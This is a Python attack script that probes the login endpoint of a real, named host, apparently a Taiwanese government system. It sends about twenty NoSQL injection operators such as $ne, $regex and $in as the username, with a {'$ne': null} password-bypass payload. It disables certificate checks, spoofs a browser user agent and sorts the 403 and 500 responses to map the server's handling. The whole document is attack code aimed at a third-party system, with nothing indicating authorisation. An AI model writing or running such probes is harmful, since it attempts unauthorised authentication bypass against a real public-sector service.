import requests, json, urllib3, time
urllib3.disable_warnings()
BASE="https://epcr.tpf.gov.tw:4004"
def login(body):
    s=requests.Session(); s.verify=False; s.headers.update({"User-Agent":"Mozilla/5.0"})
    s.get(BASE+"/captcha",timeout=12)
    try:
        r=s.post(BASE+"/login",json=body,timeout=12); return r.status_code
    except Exception as e: return None

print("=== 操作符边界 (403 vs 500) ===")
# username 各种操作符, password $ne
ops={
  "$ne None": {"$ne":None},
  "$ne null(str)": {"$ne":"null"},
  "$or ne": {"$or":[{"$ne":None}]},
  "$and ne": {"$and":[{"$ne":None}]},
  "$gt empty": {"$gt":""},
  "$lt z": {"$lt":"z"},
  "$regex .": {"$regex":"."},
  "$regex *": {"$regex":".*"},
  "$in multi": {"$in":["a","b","c"]},
  "$in single": {"$in":["admin"]},
  "$nin": {"$nin":["zzz"]},
  "$exists": {"$exists":True},
  "$type string": {"$type":"string"},
  "$size": {"$size":1},
  "$elemMatch": {"$elemMatch":{}},
  "$all": {"$all":["a"]},
  "$not eq": {"$not":{"$eq":"z"}},
  "$ne + $or": {"$or":[{"$ne":None},{"$ne":"z"}]},
  "double $ne": {"$ne":{"$ne":None}},
  "$eq string": {"$eq":"admin"},
}
for tag,op in ops.items():
    code=login({"username":op,"password":{"$ne":None},"captcha":"1","domain":"AUTH_SERVER"})
    path="SOURCE-403" if code==403 else ("CRASH-500" if code==500 else f"{code}")
    print(f"  username:{tag:18s} -> {code} {path}")
    time.sleep(0.06)
print("DONE")
